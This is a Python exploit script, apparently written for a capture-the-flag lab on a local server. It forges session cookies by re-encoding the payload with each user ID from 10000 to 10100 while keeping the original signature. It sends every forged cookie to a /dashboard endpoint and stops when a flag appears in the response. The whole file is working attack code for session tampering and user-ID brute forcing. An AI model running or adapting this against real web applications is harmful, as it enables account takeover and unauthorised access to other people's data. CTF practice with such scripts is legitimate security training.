import base64
import json
import requests

# Configuration
BASE_URL = "http://127.0.0.1:33187"
VALID_SESSION = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

print("[*] Starting user ID brute force (10000-10100)")
print(f"[*] Base URL: {BASE_URL}")
print()

found_flag = None
last_printed = 0

for user_id in range(10000, 10101):
    try:
        # Create modified cookie
        parts = VALID_SESSION.split('.')
        new_payload = {"user_id": str(user_id)}
        payload_json = json.dumps(new_payload, separators=(',', ':'))
        new_payload_b64 = base64.b64encode(payload_json.encode()).decode()
        modified_cookie = f"{new_payload_b64}.{parts[1]}.{parts[2]}"
        
        # Send request
        response = requests.get(
            f"{BASE_URL}/dashboard",
            headers={'User-Agent': 'Mozilla/5.0'},
            cookies={'session': modified_cookie},
            timeout=10
        )
        
        # Check for FLAG
        if 'FLAG{' in response.text:
            start = response.text.find('FLAG{')
            end = response.text.find('}', start)
            if end != -1:
                found_flag = response.text[start:end+1]
                print(f"[!] FLAG FOUND at user_id={user_id}")
                print(f"[!] FLAG: {found_flag}")
                print(f"[!] Status: {response.status_code}, Response preview: {response.text[:200]}")
                break
        
        # Progress
        if user_id - last_printed >= 10:
            print(f"[*] Progress: tested up to {user_id}")
            last_printed = user_id
            
    except Exception as e:
        print(f"[!] Error at user_id {user_id}: {e}")

if found_flag:
    print("\n[SUCCESS] Flag discovered!")
else:
    print("\n[-] No flag found in tested range")
